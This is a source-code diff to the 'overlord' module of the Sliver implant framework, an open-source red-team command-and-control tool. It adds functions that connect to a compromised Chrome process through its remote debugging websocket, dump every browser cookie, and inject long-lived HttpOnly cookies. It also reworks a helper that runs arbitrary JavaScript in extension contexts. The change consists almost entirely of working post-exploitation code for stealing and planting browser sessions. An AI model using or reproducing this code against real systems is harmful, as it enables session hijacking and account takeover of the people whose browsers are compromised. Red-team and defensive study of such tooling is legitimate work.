@@ -3,14 +3,17 @@ package overlord
 /*
 	Sliver Implant Framework
 	Copyright (C) 2022  Bishop Fox
+
 	This program is free software: you can redistribute it and/or modify
 	it under the terms of the GNU General Public License as published by
 	the Free Software Foundation, either version 3 of the License, or
 	(at your option) any later version.
+
 	This program is distributed in the hope that it will be useful,
 	but WITHOUT ANY WARRANTY; without even the implied warranty of
 	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 	GNU General Public License for more details.
+
 	You should have received a copy of the GNU General Public License
 	along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */
@@ -24,8 +27,11 @@ import (
 	"log"
 	"net/http"
 	"net/url"
+	"time"
 
 	"github.com/bishopfox/sliver/client/core"
+	"github.com/chromedp/cdproto/cdp"
+	"github.com/chromedp/cdproto/network"
 	"github.com/chromedp/cdproto/page"
 	"github.com/chromedp/cdproto/target"
 	"github.com/chromedp/chromedp"
@@ -158,7 +164,10 @@ func ExecuteJS(ctx context.Context, string, targetID string, jsCode string) ([]b
 	}
 	extCtx, _ := chromedp.NewContext(ctx, chromedp.WithTargetID(targetInfo.TargetID))
 	var result []byte
-	err := chromedp.Run(extCtx, chromedp.Evaluate(jsCode, &result))
+	evalTasks := chromedp.Tasks{
+		chromedp.Evaluate(jsCode, &result),
+	}
+	err := chromedp.Run(extCtx, evalTasks)
 	return result, err
 }
 
@@ -258,6 +267,67 @@ func QueryExtensionDebugTargets(debugURL string) ([]ChromeDebugTarget, error) {
 		}
 	}
 	return extensionContexts, nil
+}
+
+func DumpCookies(curse *core.CursedProcess, webSocketURL string) ([]*network.Cookie, error) {
+	var cookies []*network.Cookie
+	var err error
+	setCookieTasks := chromedp.Tasks{
+		// read network values
+		chromedp.ActionFunc(func(ctx context.Context) error {
+			cookies, err = network.GetAllCookies().Do(ctx)
+			if err != nil {
+				return err
+			}
+			// for i, cookie := range cookies {
+			// 	log.Printf("chrome cookie %d: %+v", i, cookie)
+			// }
+			return nil
+		}),
+	}
+	taskCtx, taskCancel, cancel := GetChromeContext(webSocketURL, curse)
+	defer taskCancel()
+	defer cancel()
+	ctx, _ := chromedp.NewContext(taskCtx)
+	if err := chromedp.Run(ctx, setCookieTasks); err != nil {
+		return cookies, err
+	}
+	return cookies, nil
+}
+
+func SetCookie(curse *core.CursedProcess, webSocketURL string, host string, cookies ...string) (string, error) {
+	var res string
+	setCookieTasks := chromedp.Tasks{
+		chromedp.ActionFunc(func(ctx context.Context) error {
+			// create cookie expiration
+			expr := cdp.TimeSinceEpoch(time.Now().Add(180 * 24 * time.Hour))
+			// add cookies to chrome
+			for i := 0; i < len(cookies); i += 2 {
+				err := network.SetCookie(cookies[i], cookies[i+1]).
+					WithExpires(&expr).
+					WithDomain("localhost").
+					WithHTTPOnly(true).
+					Do(ctx)
+				if err != nil {
+					return err
+				}
+			}
+			return nil
+		}),
+		// navigate to site
+		// chromedp.Navigate(host),
+		// read the returned values
+		// chromedp.Text(`#result`, &res, chromedp.ByID, chromedp.NodeVisible),
+	}
+	taskCtx, taskCancel, cancel := GetChromeContext(webSocketURL, curse)
+	defer taskCancel()
+	defer cancel()
+	ctx, _ := chromedp.NewContext(taskCtx)
+	if err := chromedp.Run(ctx, setCookieTasks); err != nil {
+		return "", err
+	}
+
+	return res, nil
 }
 
 // Screenshot - Take a screenshot of a Chrome context
